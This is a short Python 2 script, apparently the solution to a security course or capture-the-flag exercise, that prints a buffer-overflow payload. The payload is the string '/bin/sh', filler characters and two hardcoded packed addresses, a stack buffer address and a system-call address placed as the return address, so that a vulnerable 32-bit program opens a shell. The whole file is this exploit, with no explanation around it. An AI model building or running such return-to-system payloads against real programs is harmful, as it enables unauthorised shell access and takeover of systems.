from struct import pack
from shellcode import shellcode

bufAddr = 0xbffea0d6
sysCallAddr = 0x08048eed
retadd = sysCallAddr

print "/bin/sh" + " " + "#" * (26-4-4-7-1) + pack("<I", bufAddr) + pack("<I", retadd)